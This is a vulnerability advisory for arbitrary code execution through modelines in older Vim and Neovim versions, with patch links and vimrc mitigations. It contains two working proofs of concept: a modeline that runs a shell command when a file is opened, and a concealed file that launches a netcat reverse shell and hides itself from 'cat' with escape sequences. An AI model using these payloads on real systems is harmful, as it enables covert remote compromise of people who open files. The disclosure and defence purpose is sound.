
Vim/Neovim Arbitrary Code Execution via Modelines
=================================================

```
Product: Vim < 8.1.1365, Neovim < 0.3.6
Type:    Arbitrary Code Execution
```

Summary
-------

Vim before 8.1.1365 and Neovim before 0.3.6 are vulnerable to arbitrary code
execution via modelines by opening a specially crafted text file.


Proof of concept
----------------

- Create [`poc.txt`](https://github.com/numirias/security/blob/master/data/2019-06-04_ace-vim-neovim/poc.txt):

      :!uname -a||" vi:fen:fdm=expr:fde=assert_fails("source\!\ \%"):fdl=0:fdt="

- Ensure that the modeline option has not been disabled (`:set modeline`).

- Open the file in Vim:

      $ vim poc.txt

- The system will execute `uname -a`.


Proof of concept 2 (reverse shell)
----------------------------------

This PoC outlines a real-life attack approach in which a reverse shell
is launched once the user opens the file. To conceal the attack, the file will
be immediately rewritten when opened. Also, the PoC uses terminal escape
sequences to hide the modeline when the content is printed with `cat`.
(`cat -v` reveals the actual content.)
(`cat -e` reveals the actual content.)

[`shell.txt`](https://github.com/numirias/security/blob/master/data/2019-06-04_ace-vim-neovim/shell.txt):

    \x1b[?7l\x1bSNothing here.\x1b:silent! w | call system(\'nohup nc 127.0.0.1 9999 -e /bin/sh &\') | redraw! | file | silent! # " vim: set fen fdm=expr fde=assert_fails(\'set\\ fde=x\\ \\|\\ source\\!\\ \\%\') fdl=0: \x16\x1b[1G\x16\x1b[KNothing here."\x16\x1b[D \n

Demo (victim left, attacker right):

![Reverse shell demo](https://i.imgur.com/8w4tteX.gif)

Details
-------

The modeline feature allows to specify custom editor options near the start or
end of a file. This feature is enabled by default and applied to all file
types, including plain `.txt`. (Note that some OSes ship with a custom vimrc
that explicitly sets `nomodelines`, e.g. Debian. So if you use their custom
default vimrc instead of Vim's native defaults, you're safe.)

Patches
-------

- [Vim patch 8.1.1365](https://github.com/vim/vim/commit/5357552)
- [Neovim patch](https://github.com/neovim/neovim/pull/10082) (released in [v0.3.6](https://github.com/neovim/neovim/releases/tag/v0.3.6))


Check if you have modelines enabled by opening vim and entering

```:set modeline?```

If vim returns ```nomodeline```, you are not vulnerable.  If you are vulnerable
or want to ensure your security with this issue, add these lines to your vimrc:

```
set modelines=0
set nomodeline
```

Found vimrc:

```:verbose set modeline?```

[Links](https://www.youtube.com/watch?v=o-_oGSxUY3Y)
